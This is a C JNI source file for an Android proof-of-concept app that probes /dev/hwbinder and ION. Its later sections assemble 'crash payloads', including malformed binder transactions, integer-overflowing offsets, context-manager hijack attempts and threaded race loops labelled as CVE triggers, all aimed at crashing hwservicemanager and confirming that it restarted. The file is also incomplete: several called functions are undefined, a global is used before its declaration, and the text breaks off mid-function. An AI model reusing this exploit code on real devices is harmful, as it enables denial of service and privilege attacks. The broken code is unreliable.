#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/stat.h>
#include <limits.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdint.h>
#include <time.h>
#include <pthread.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static JavaVM* g_vm = NULL;

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP _IOWR(ION_IOC_MAGIC, 7, struct ion_fd_data)
#define ION_HEAP_SYSTEM 25

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    unsigned int handle;
};
struct ion_fd_data {
    unsigned int handle;
    int fd;
};
struct ion_handle_data {
    unsigned int handle;
};

JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    g_vm = vm;
    LOGD("JNI_OnLoad");
    return JNI_VERSION_1_6;
}

JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
    LOGD("JNI_OnUnload");
}

JNIEXPORT jobjectArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;

    DIR* dir = opendir(cpath);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (dir == NULL) {
        LOGE("opendir(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }

    int count = 0;
    struct dirent* entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] != '.') count++;
    }
    rewinddir(dir);

    jclass stringClass = (*env)->FindClass(env, "java/lang/String");
    if (stringClass == NULL) {
        closedir(dir);
        return NULL;
    }
    jobjectArray result = (*env)->NewObjectArray(env, count, stringClass, NULL);
    if (result == NULL) {
        closedir(dir);
        return NULL;
    }

    int idx = 0;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        jstring name = (*env)->NewStringUTF(env, entry->d_name);
        if (name != NULL) {
            (*env)->SetObjectArrayElement(env, result, idx++, name);
            (*env)->DeleteLocalRef(env, name);
        }
    }
    closedir(dir);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadFile(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    int fd = open(cpath, O_RDONLY);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }
    char buf[8192];
    ssize_t len = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (len <= 0) return NULL;
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeWriteFile(JNIEnv* env, jclass clazz, jstring path, jstring content) {
    if (path == NULL || content == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    const char* ccontent = (*env)->GetStringUTFChars(env, content, NULL);
    if (cpath == NULL || ccontent == NULL) {
        if (cpath) (*env)->ReleaseStringUTFChars(env, path, cpath);
        if (ccontent) (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return NULL;
    }
    int fd = open(cpath, O_WRONLY);
    if (fd < 0) {
        LOGE("open(%s) for write failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        (*env)->ReleaseStringUTFChars(env, content, ccontent);
        return (*env)->NewStringUTF(env, strerror(errno));
    }
    ssize_t written = write(fd, ccontent, strlen(ccontent));
    close(fd);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    (*env)->ReleaseStringUTFChars(env, content, ccontent);
    if (written < 0) return (*env)->NewStringUTF(env, strerror(errno));
    return (*env)->NewStringUTF(env, "OK");
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeReadLink(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return NULL;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return NULL;
    char buf[PATH_MAX];
    ssize_t len = readlink(cpath, buf, sizeof(buf)-1);
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    if (len < 0) {
        LOGE("readlink(%s) failed: %s", cpath, strerror(errno));
        return NULL;
    }
    buf[len] = '\0';
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeTestFd(JNIEnv* env, jclass clazz, jint fd) {
    char buf[256] = {0};
    int flags = fcntl(fd, F_GETFL);
    if (flags < 0) {
        snprintf(buf, sizeof(buf), "fcntl failed: %s", strerror(errno));
        return (*env)->NewStringUTF(env, buf);
    }
    int type = flags & O_ACCMODE;
    const char* type_str;
    switch(type) {
        case O_RDONLY: type_str = "RDONLY"; break;
        case O_WRONLY: type_str = "WRONLY"; break;
        case O_RDWR: type_str = "RDWR"; break;
        default: type_str = "UNKNOWN";
    }
    snprintf(buf, sizeof(buf), "flags=0x%x (%s), nonblock=%d", flags, type_str, (flags & O_NONBLOCK)?1:0);
    return (*env)->NewStringUTF(env, buf);
}

JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return -1;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return -1;
    int fd = open(cpath, O_RDWR);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        return -errno;
    }
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return fd;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeIonTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[256] = {0};
    struct ion_allocation_data alloc_data = {
        .len = 4096,
        .align = 4096,
        .heap_id_mask = 1 << ION_HEAP_SYSTEM,
        .flags = 0,
        .handle = 0
    };
    int ret = ioctl(fd, ION_IOC_ALLOC, &alloc_data);
    if (ret < 0) {
        snprintf(result, sizeof(result), "ION_IOC_ALLOC failed: %s", strerror(errno));
        return (*env)->NewStringUTF(env, result);
    }
    struct ion_fd_data fd_data = { .handle = alloc_data.handle, .fd = 0 };
    ret = ioctl(fd, ION_IOC_MAP, &fd_data);
    if (ret < 0) {
        snprintf(result, sizeof(result), "ION_IOC_MAP failed: %s", strerror(errno));
        struct ion_handle_data handle_data = { .handle = alloc_data.handle };
        ioctl(fd, ION_IOC_FREE, &handle_data);
        return (*env)->NewStringUTF(env, result);
    }
    close(fd_data.fd);
    struct ion_handle_data handle_data = { .handle = alloc_data.handle };
    ioctl(fd, ION_IOC_FREE, &handle_data);
    snprintf(result, sizeof(result), "ION test succeeded: allocated and mapped 4096 bytes (vulnerability may be exploitable)");
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[256] = {0};
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Binder version: %d (protocol %d) - vulnerability may be exploitable",
                 version.protocol_version, version.protocol_version);
    } else {
        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderFurther(JNIEnv* env, jclass clazz, jint fd) {
    char result[512] = {0};
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Binder protocol: %d. ", version.protocol_version);
    } else {
        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s. ", strerror(errno));
    }

    int max_threads = 10;
    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads) == 0) {
        strcat(result, "BINDER_SET_MAX_THREADS succeeded. ");
    } else {
        strcat(result, "BINDER_SET_MAX_THREADS failed: ");
        strcat(result, strerror(errno));
        strcat(result, ". ");
    }

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0;
    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF succeeded: strong=");
        char tmp[32];
        sprintf(tmp, "%u", info.strong_count);
        strcat(result, tmp);
        strcat(result, " weak=");
        sprintf(tmp, "%u", info.weak_count);
        strcat(result, tmp);
    } else {
        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF failed: ");
        strcat(result, strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeGetKernelInfo(JNIEnv* env, jclass clazz) {
    char result[4096] = {0};
    const char* files[] = {
        "/proc/version", "/proc/cmdline", "/proc/meminfo", "/proc/iomem", "/proc/modules",
        "/proc/sys/kernel/ostype", "/proc/sys/kernel/osrelease",
        "/sys/kernel/debug/kallsyms", "/sys/kernel/security/lsm",
        "/proc/self/status", "/proc/self/stat"
    };
    char buf[1024];
    for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); i++) {
        int fd = open(files[i], O_RDONLY);
        if (fd >= 0) {
            ssize_t n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) {
                buf[n] = '\0';
                strcat(result, files[i]);
                strcat(result, ": ");
                strcat(result, buf);
                strcat(result, "\n");
            } else {
                strcat(result, files[i]);
                strcat(result, ": (empty)\n");
            }
        } else {
            strcat(result, files[i]);
            strcat(result, ": (unreadable)\n");
        }
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderAdvancedTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[1024] = {0};
    int ret;

    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Binder protocol version: %d\n", version.protocol_version);
    } else {
        snprintf(result, sizeof(result), "Failed to get version: %s\n", strerror(errno));
        return (*env)->NewStringUTF(env, result);
    }

    int max_threads = 10;
    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads) == 0) {
        strcat(result, "BINDER_SET_MAX_THREADS succeeded (set to 10).\n");
    } else {
        strcat(result, "BINDER_SET_MAX_THREADS failed: ");
        strcat(result, strerror(errno));
        strcat(result, "\n");
    }

    struct binder_node_info_for_ref info;
    memset(&info, 0, sizeof(info));
    info.handle = 0;
    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
        char tmp[64];
        snprintf(tmp, sizeof(tmp), "Node info for handle 0: strong=%u weak=%u\n", info.strong_count, info.weak_count);
        strcat(result, tmp);
    } else {
        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF failed: ");
        strcat(result, strerror(errno));
        strcat(result, " (expected without permission)\n");
    }

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 0,
            .cookie = 0,
            .code = 0,
            .flags = 0,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    struct binder_transaction_data reply_data;
    bwr.read_size = sizeof(reply_data);
    bwr.read_buffer = (binder_uintptr_t)&reply_data;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        strcat(result, "BINDER_WRITE_READ with transaction succeeded (unexpected). ");
        if (bwr.read_consumed > 0) {
            strcat(result, "Reply received.\n");
        }
    } else {
        strcat(result, "BINDER_WRITE_READ transaction failed: ");
        strcat(result, strerror(errno));
        strcat(result, " (expected, permission denied or handle invalid)\n");
    }

    struct binder_node_debug_info debug_info;
    memset(&debug_info, 0, sizeof(debug_info));
    if (ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &debug_info) == 0) {
        char tmp[128];
        snprintf(tmp, sizeof(tmp), "Node debug info: ptr=%llx cookie=%llx strong=%u weak=%u\n",
                 (unsigned long long)debug_info.ptr, (unsigned long long)debug_info.cookie,
                 debug_info.has_strong_ref, debug_info.has_weak_ref);
        strcat(result, tmp);
    } else {
        strcat(result, "BINDER_GET_NODE_DEBUG_INFO failed: ");
        strcat(result, strerror(errno));
        strcat(result, " (likely requires root)\n");
    }

    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderOverflowTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[512] = {0};
    size_t huge_size = 1024 * 1024 * 64;
    char* huge_buf = malloc(huge_size);
    if (!huge_buf) {
        snprintf(result, sizeof(result), "Overflow test: failed to allocate %zu bytes", huge_size);
        return (*env)->NewStringUTF(env, result);
    }
    memset(huge_buf, 0x41, huge_size);

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = huge_size;
    bwr.write_buffer = (binder_uintptr_t)huge_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(huge_buf);
    if (ret == 0) {
        snprintf(result, sizeof(result), "Overflow test: BINDER_WRITE_READ with huge buffer succeeded (unexpected)");
    } else {
        snprintf(result, sizeof(result), "Overflow test: BINDER_WRITE_READ with huge buffer failed: %s (expected error)", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderWriteTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[256] = {0};
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 1,
            .cookie = 0,
            .code = 0,
            .flags = 0,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        snprintf(result, sizeof(result), "Write test: BINDER_WRITE_READ with BC_TRANSACTION succeeded (handle 1)");
    } else {
        snprintf(result, sizeof(result), "Write test: BINDER_WRITE_READ with BC_TRANSACTION failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderHalCommand(JNIEnv* env, jclass clazz, jint fd) {
    char result[512] = {0};
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 0,
            .cookie = 0,
            .code = 0,
            .flags = TF_ONE_WAY,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    struct binder_transaction_data reply;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)&reply;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        strcat(result, "HAL command test: BINDER_WRITE_READ with BC_TRANSACTION (handle 0, oneway) succeeded. ");
        if (bwr.read_consumed > 0) {
            strcat(result, "Reply received (unexpected for oneway).");
        } else {
            strcat(result, "No reply (as expected for oneway).");
        }
    } else {
        strcat(result, "HAL command test: BINDER_WRITE_READ failed: ");
        strcat(result, strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwbinderReadTest(JNIEnv* env, jclass clazz, jint fd) {
    char result[512] = {0};
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = 0,
            .cookie = 0,
            .code = 0,
            .flags = 0,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    struct binder_transaction_data reply;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)&reply;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        strcat(result, "Read test: BINDER_WRITE_READ succeeded. ");
        if (bwr.read_consumed > 0) {
            strcat(result, "Reply data read (");
            char tmp[32];
            sprintf(tmp, "%llu", (unsigned long long)bwr.read_consumed);
            strcat(result, tmp);
            strcat(result, " bytes).");
        } else {
            strcat(result, "No reply data.");
        }
    } else {
        strcat(result, "Read test: BINDER_WRITE_READ failed: ");
        strcat(result, strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderGetVersion(JNIEnv* env, jclass clazz, jint fd) {
    char result[128] = {0};
    struct binder_version version;
    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
        snprintf(result, sizeof(result), "Protocol version: %d", version.protocol_version);
    } else {
        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
    char result[256] = {0};
    int ret = ioctl(fd, cmd, (unsigned long)arg);
    if (ret == 0) {
        snprintf(result, sizeof(result), "ioctl(0x%x) succeeded", cmd);
    } else {
        snprintf(result, sizeof(result), "ioctl(0x%x) failed: %s", cmd, strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderSendTransaction(JNIEnv* env, jclass clazz, jint fd, jint handle, jint code, jint flags) {
    char result[512] = {0};
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx = {
        .cmd = BC_TRANSACTION,
        .tdata = {
            .target.handle = (uint32_t)handle,
            .cookie = 0,
            .code = (uint32_t)code,
            .flags = (uint32_t)flags,
            .sender_pid = 0,
            .sender_euid = 0,
            .data_size = 0,
            .offsets_size = 0,
            .data.ptr.buffer = 0,
            .data.ptr.offsets = 0
        }
    };

    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    struct binder_transaction_data reply;
    bwr.read_size = sizeof(reply);
    bwr.read_buffer = (binder_uintptr_t)&reply;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (ret == 0) {
        snprintf(result, sizeof(result), "ioctl(BINDER_WRITE_READ) succeeded, read_consumed=%llu",
                 (unsigned long long)bwr.read_consumed);
        if (bwr.read_consumed > 0) {
            strcat(result, " (reply received)");
        } else {
            strcat(result, " (no reply)");
        }
    } else {
        snprintf(result, sizeof(result), "ioctl(BINDER_WRITE_READ) failed: %s", strerror(errno));
    }
    return (*env)->NewStringUTF(env, result);
}

// ==================== hwservicemanager PID 取得の改善 ====================
static pid_t get_hwservicemanager_pid(void) {
    // まず pidof を試す
    FILE *fp = popen("pidof hwservicemanager 2>/dev/null", "r");
    if (fp) {
        char buf[16];
        if (fgets(buf, sizeof(buf), fp)) {
            pclose(fp);
            pid_t pid = atoi(buf);
            if (pid > 0) return pid;
        }
        pclose(fp);
    }
    // 次に ps を試す
    fp = popen("ps -A | grep hwservicemanager | awk '{print $2}' 2>/dev/null", "r");
    if (fp) {
        char buf[16];
        if (fgets(buf, sizeof(buf), fp)) {
            pclose(fp);
            pid_t pid = atoi(buf);
            if (pid > 0) return pid;
        }
        pclose(fp);
    }
    // 最後に /proc をスキャン
    DIR *dir = opendir("/proc");
    if (!dir) return -1;
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_DIR) continue;
        pid_t pid = atoi(entry->d_name);
        if (pid <= 0) continue;
        char path[256];
        snprintf(path, sizeof(path), "/proc/%d/cmdline", pid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            char cmd[64];
            ssize_t n = read(fd, cmd, sizeof(cmd)-1);
            close(fd);
            if (n > 0) {
                cmd[n] = '\0';
                if (strstr(cmd, "hwservicemanager") != NULL) {
                    closedir(dir);
                    return pid;
                }
            }
        }
    }
    closedir(dir);
    return -1;
}

// ==================== 追加クラッシュペイロード ====================
static int crash_set_idle_timeout(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }
    int64_t timeout = -1;
    int ret = ioctl(hwbinder_fd, BINDER_SET_IDLE_TIMEOUT, &timeout);
    close(hwbinder_fd);
    LOGI("BINDER_SET_IDLE_TIMEOUT ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

static int crash_set_idle_priority(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }
    int32_t priority = 0xFFFFFFFF;
    int ret = ioctl(hwbinder_fd, BINDER_SET_IDLE_PRIORITY, &priority);
    close(hwbinder_fd);
    LOGI("BINDER_SET_IDLE_PRIORITY ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

static int crash_null_buffer_transaction(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0; // NULL
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    close(hwbinder_fd);
    LOGI("NULL buffer transaction ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

static int crash_offsets_size_overflow(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }
    uint8_t *data = malloc(4096);
    if (!data) { close(hwbinder_fd); return -1; }
    memset(data, 0x41, 4096);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = 0xFFFFFFFF;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);
    LOGI("offsets_size overflow ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

static int crash_set_context_mgr_ext(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open /dev/hwbinder failed");
        return -1;
    }
    struct binder_set_context_mgr_ext ext;
    ext.is_valid = 1;
    ext.flags = 0xFFFFFFFF;
    int ret = ioctl(hwbinder_fd, BINDER_SET_CONTEXT_MGR_EXT, &ext);
    close(hwbinder_fd);
    LOGI("BINDER_SET_CONTEXT_MGR_EXT ret=%d (%s)", ret, ret==0?"SUCCESS":strerror(errno));
    return (ret == 0) ? 0 : -1;
}

// ==================== 既存ペイロードの強化版 ====================
static int send_malformed_transaction_enhanced(void) {
    LOGI("Sending enhanced malformed transaction with invalid offsets...");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        LOGE("open failed");
        return -1;
    }

    uint8_t *data = malloc(4096);
    if (!data) { close(hwbinder_fd); return -1; }
    memset(data, 0x41, 4096);

    // offsets 配列は範囲外を指定（相変わらず）
    binder_size_t offsets[10];
    for (int i = 0; i < 10; i++) offsets[i] = 8192 + i * 8;

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4096;
    tx.tdata.offsets_size = sizeof(offsets);
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
    tx.tdata.data.ptr.offsets = (binder_uintptr_t)offsets;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 0;
    bwr.read_buffer = 0;

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    close(hwbinder_fd);
    if (ret < 0) {
        LOGI("Enhanced malformed transaction sent (expected error)");
        return 0;
    }
    LOGI("Enhanced malformed transaction succeeded unexpectedly");
    return 0;
}

// ==================== 競合条件の強化（スレッド版） ====================
static void* race_thread_worker(void *arg) {
    int hwbinder_fd = *(int*)arg;
    for (int i = 0; i < 200; i++) {
        struct binder_write_read bwr;
        memset(&bwr, 0, sizeof(bwr));
        ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
        usleep(50);
    }
    return NULL;
}

static int trigger_cve_2020_0423_enhanced(void) {
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) return -1;

    pthread_t threads[8];
    for (int i = 0; i < 8; i++) {
        pthread_create(&threads[i], NULL, race_thread_worker, &hwbinder_fd);
    }
    for (int i = 0; i < 8; i++) {
        pthread_join(threads[i], NULL);
    }
    close(hwbinder_fd);
    LOGI("Enhanced race condition test completed with 8 threads");
    return 0;
}

// ==================== 複合クラッシュ攻撃（強化版） ====================
static int crash_hwservicemanager(void) {
    LOGI("Attempting enhanced multiple crash vectors...");
    int ret = 0;

    for (int round = 0; round < 3; round++) {
        LOGI("Crash round %d", round + 1);

        ret |= crash_with_huge_name();
        usleep(100000);
        ret |= send_malformed_transaction_enhanced();
        usleep(100000);
        ret |= send_huge_data_transaction();
        usleep(100000);
        ret |= trigger_cve_2020_0041();
        usleep(100000);
        ret |= trigger_cve_2020_0273();
        usleep(100000);
        ret |= trigger_cve_2020_0423_enhanced();
        usleep(100000);
        ret |= crash_set_max_threads();
        usleep(100000);
        ret |= crash_set_context_mgr();
        usleep(100000);
        ret |= crash_set_idle_timeout();
        usleep(100000);
        ret |= crash_set_idle_priority();
        usleep(100000);
        ret |= crash_null_buffer_transaction();
        usleep(100000);
        ret |= crash_offsets_size_overflow();
        usleep(100000);
        ret |= crash_set_context_mgr_ext();
        usleep(100000);
    }

    pid_t new_pid = get_hwservicemanager_pid();
    if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
        LOGI("hwservicemanager crashed and restarted! New PID: %d", new_pid);
        g_hwservicemanager_pid = new_pid;
        return 0;
    } else {
        LOGI("hwservicemanager did not crash (still PID %d)", g_hwservicemanager_pid);
        return -1;
    }
}

// ==================== 既存の関数（再利用） ====================
static pid_t g_hwservicemanager_pid = -1;

static int crash_with_huge_name(void) {
    LOGI("Trying crash with 8KB service name...");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    int ret = exploit_cve_2019_2023(payload);
    free(payload);
    return ret;
}

static int send_huge_data_transaction(void) {
    LOGI("Sending transaction with huge data_size...");
